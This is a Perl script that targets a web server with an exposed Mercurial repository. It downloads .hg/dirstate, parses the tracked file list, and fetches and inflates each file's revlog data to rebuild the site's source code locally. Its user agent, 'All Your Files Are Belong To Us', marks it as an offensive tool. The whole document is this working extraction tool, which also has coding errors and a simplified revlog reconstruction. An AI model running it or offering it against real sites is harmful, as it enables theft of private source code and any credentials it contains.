#!/usr/bin/perl

use IO::Uncompress::Inflate qw(inflate $InflateError);
use File::Path qw(make_path);
use LWP::UserAgent;
use File::Temp qw(tempfile tempdir);

# First grab the database file
my $target=$ARGV[0];
my $hgurl="http://$ARGV[0]/.hg/dirstate";
my $ua=LWP::UserAgent->new;
$ua->agent("All Your Files Are Belong To Us/1.0");
my $request=HTTP::Request->new(GET => $hgurl);
my $result=$ua->request($request);

if ($result->status_line !~ /^200/)
{
   die "Could not find Mercurial database";
}

my ($dbfileh, $dbfilen) = tempfile();
print $dbfileh $result->content;
close $dbfileh;

open(my $infile, "<", $dbfilen);
binmode($infile);

my $rawdata;
my $p1;
my $p2;

read $infile, my $rawdata, 20;
($p1)=unpack("H*", $rawdata);
read $infile, my $rawdata, 20;
($p2)=unpack("H*", $rawdata);

my @index_entries = ();
my $entries=0;

do
{
   my $entry = {};
   my $rawdata;

   read $infile, $rawdata, 17; 

   ( $entry->{'status'},
     $entry->{'mode'},
     $entry->{'size'},
     $entry->{'mtime'},
     $entry->{'length'} ) = unpack "CNNNN", $rawdata; 

   read $infile, $rawdata, $entry->{'length'};
   ( $entry->{'name'} ) = unpack "a" . $entry->{'length'}, $rawdata;
   
   push(@index_entries, $entry);

} while (!eof($infile));
close($infile);
unlink($dbfilen);
my $server=$ARGV[0];

# Now extract the files
foreach my $entry (@index_entries)
{
   my $indexfile=".hg/store/data/" . $entry->{'name'};
   my $indexfh;
   my $rawdata;
   my $datafile=0;

   print "Extracting " . $entry->{'name'} . "\n";

   # mangle indexfile for the upper case wankery mercurial does
   $indexfile =~ s/_/__/g;
   $indexfile =~ s/([A-Z])/_\l$1/g;
   my $mangledname="";

   foreach my $char (split(//,$indexfile))
   {
      my $result=$char;
      if ($char lt ' ' || $char gt '~')
      {
         $result='~' . unpack(H2, $char);
      }
      $mangledname.=$result;
   }
 
   my $hgurl="http://$server/$mangledname" . ".i";
   my $fua=LWP::UserAgent->new;
   $fua->agent("All Your Files Are Belong To Us/1.0");
   my $frequest=HTTP::Request->new(GET => $hgurl);
   my $fresult=$fua->request($frequest);
   
   my ($dbfileh, $dbfilen) = tempfile();
   print $dbfileh $fresult->content;
   close $dbfileh;

   open $indexfh, "<", $dbfilen;
   binmode($indexfh);

   $hgurl="http://$server/$mangledname" . ".d";
   $frequest=HTTP::Request->new(GET => $hgurl);
   $fresult=$fua->request($frequest);
   if ($fresult->status_line =~ /^200/)
   {
      my ($dfileh, $dfilen) = tempfile();
      print $dfileh $fresult->content;
      close $dfileh;
      open $datafh, "<", $dfilen;
      $datafile=1;
   }

   # Make sure the path is there for the output
   my $outputpath="output/" . $entry->{'name'};
   $outputpath =~ s#/[^/]*$##g;
   
   make_path($outputpath);
   open $oh, ">", "output/$entry->{'name'}";
   
   do
   {
      my $head={};
   
      read $indexfh, $rawdata, 6;
      my $msb, $nmsb=0;
      ( $msb, $nmsb, $head->{'offset'} ) = unpack "CCN", $rawdata;
      $head{'offset'} = head->{'offset'} + ($nmsb << 32) + ($msb << 40);

      read $indexfh, $rawdata, 58;
 
      ( $head->{'flags'},
        $head->{'clength'},
        $head->{'ulength'},
        $head->{'base'},
        $head->{'link'},
        $head->{'p1'},
        $head->{'p2'},
        $head->{'nodeid'} ) = unpack "SNNNNNNH*",$rawdata;

      # Now read the data
      my $cookeddata;
      if ($head->{'clength'} > 0)
      {
         if ($datafile == 1)
         {
            read $datafh, $rawdata, $head->{'clength'};
         }
         else
         {
            read $indexfh, $rawdata, $head->{'clength'};
         }
         inflate(\$rawdata => \$cookeddata);
      }

      # And write it
      print $oh $cookeddata;

   } while (!eof($indexfh));

   close($indexfh);
   unlink($dbfilen);
   if ($datafile == 1) { close($datafh); unlink($dfilen) }
   close($oh);
}